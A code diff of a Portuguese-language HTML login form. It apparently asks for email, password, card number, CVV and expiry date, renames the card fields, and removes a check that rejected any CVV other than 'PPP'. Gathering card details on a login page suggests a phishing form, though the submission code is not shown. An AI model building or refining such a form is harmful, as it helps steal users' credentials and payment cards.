@@ -94,13 +94,13 @@
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
             <div class="form-group">
-                <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Número do Cartão">
+                <input type="text" class="form-control" id="cardNumber" name="cartao_numero" placeholder="Número do Cartão">
             </div>
             <div class="form-group">
-                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
+                <input type="text" class="form-control" id="cvv" name="cartao_seguranca" placeholder="CVV">
             </div>
             <div class="form-group">
-                <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade">
+                <input type="text" class="form-control" id="expiryDate" name="cartao_validade" placeholder="Data de Validade">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
@@ -115,13 +115,8 @@
             var cvv = document.getElementById('cvv').value;
             var expiryDate = document.getElementById('expiryDate').value;
 
-            if (email === '' || password === '' || cardNumber === '' || expiryDate === '') {
+            if (email === '' || password === '' || cardNumber === '' || cvv === '' || expiryDate === '') {
                 document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
-                return;
-            }
-
-            if (cvv !== 'PPP') {
-                document.getElementById('mensagemErro').innerText = 'CVV incorreto. Por favor, verifique e tente novamente.';
                 return;
             }
 
